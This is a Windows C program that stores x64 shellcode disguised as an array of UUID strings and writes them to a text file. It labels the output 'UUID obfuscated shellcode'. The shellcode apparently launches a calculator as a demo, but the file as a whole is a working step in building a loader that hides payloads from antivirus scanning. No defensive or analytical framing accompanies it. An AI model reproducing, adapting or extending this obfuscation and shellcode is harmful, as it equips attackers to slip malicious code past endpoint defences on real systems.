#include <Windows.h>
#include <stdio.h>

int main() {

    char* UuidArray[] = {
        "E48348FC-E8F0-00C0-0000-415141505251", "D2314856-4865-528B-6048-8B5218488B52", "728B4820-4850-B70F-4A4A-4D31C94831C0",
        "7C613CAC-2C02-4120-C1C9-0D4101C1E2ED", "48514152-528B-8B20-423C-4801D08B8088", "48000000-C085-6774-4801-D0508B481844",
        "4920408B-D001-56E3-48FF-C9418B348848", "314DD601-48C9-C031-AC41-C1C90D4101C1", "F175E038-034C-244C-0845-39D175D85844",
        "4924408B-D001-4166-8B0C-48448B401C49", "8B41D001-8804-0148-D041-5841585E595A", "59415841-5A41-8348-EC20-4152FFE05841",
        "8B485A59-E912-FF57-FFFF-5D48BA010000", "00000000-4800-8D8D-0101-000041BA318B", "D5FF876F-E0BB-2A1D-0A41-BAA695BD9DFF",
        "C48348D5-3C28-7C06-0A80-FBE07505BB47", "6A6F7213-5900-8941-DAFF-D563616C6300"
    };

    // Open a file for writing using Windows API
    HANDLE hFile = CreateFileA("shellcodeuuid.txt", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE) {
        perror("Error opening file");
        return -1;
    }

    // Write each UUID to the file
    // i < 17 corresponds to the number of UUIDs
    DWORD bytesWritten;
    for (int i = 0; i < 17; i++) {
        if (!WriteFile(hFile, UuidArray[i], strlen(UuidArray[i]), &bytesWritten, NULL)) {
            perror("Error writing to file");
            CloseHandle(hFile);
            return -1;
        }
        // Add a newline character after each UUID
        char newline = '\n';
        if (!WriteFile(hFile, &newline, 1, &bytesWritten, NULL)) {
            perror("Error writing newline to file");
            CloseHandle(hFile);
            return -1;
        }
    }

    printf("UUID obfuscated shellcode written to shellcodeuuid.txt");

    // Close the file
    CloseHandle(hFile);

    return 0; 
}
